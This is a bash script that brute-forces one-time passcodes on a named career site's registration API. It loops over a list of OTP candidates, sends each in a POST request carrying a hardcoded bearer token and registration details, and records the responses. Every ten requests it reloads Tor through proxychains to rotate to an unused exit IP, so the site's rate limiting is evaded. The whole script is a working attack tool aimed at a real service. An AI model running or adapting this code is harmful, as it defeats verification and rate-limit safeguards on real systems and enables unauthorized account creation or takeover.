rateLimit=10
count=1
sudo service tor reload
# proxychains curl ifconfig.me>>iplist.txt

getNewIp(){
    sudo service tor reload;
    new=$(proxychains curl ifconfig.me 2>/dev/null| rev | cut -f 1 -d ")" | rev)
    cat iplist.txt | while read old
    do
        if [[ "$old" == "$new" ]];
        then
            return getNewIp
        fi
    done
    echo $new>>iplist.txt
}

getNewIp
tac otp4.txt | while read line 
do
   echo -e " $count --- $line : \c">>out.txt


proxychains curl  -s -k -X $'POST' \
    -H $'Host: accounts.pickmycareer.net' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI4MDJlZTk1My1hN2ZlLTQyMzktOTc5YS0wOWVkNmQ5YTY0NDIiLCJlbWFpbCI6ImJleGVoaTMzMjdANm1haWxzLmNvbSIsImlhdCI6MTU5MzIzMzU2OCwiZXhwIjoxNTkzMzE5OTY4fQ.O-1Gf0oVI-zRxWRYFjGOxJr_MxsEDP2gZWuC2UDqSXg' -H $'Content-Type: application/json;charset=utf-8' -H $'Origin: https://pickmycareer.in' -H $'Connection: close' -H $'Referer: https://pickmycareer.in/account/register' \
    --data-binary $"{\"userId\":\"802ee953-a7fe-4239-979a-09ed6d9a6442\",\"gender\":\"male\",\"username\":\"hunter\",\"userType\":\"student\",\"parentName\":\"hunt\",\"countryCode\":\"91\",\"mobileNumber\":\"080722 51715\",\"email\":\"bexehi3327@6mails.com\",\"emailVerified\":0,\"mobileVerified\":0,\"registered\":0,\"className\":\"12\",\"registrationNumber\":\"234356456\",\"boardOfStudies\":\"stateboardmatric\",\"dateOfBirth\":\"1993-02-01\",\"cityName\":\"VARANASI - Uttar Pradesh\",\"stateName\":\"Uttar Pradesh\",\"status\":0,\"plan\":\"FREE\",\"profilePic\":null,\"otp\":\"$line\"}" \
    $'https://accounts.pickmycareer.net/api/user/account/register' 2>/dev/null | cut -d$'\n' -f 2 1>>out.txt

    echo
    if (($count%$rateLimit==0)); 
    then

        getNewIp
        
    fi
    count=$(($count+1))
done
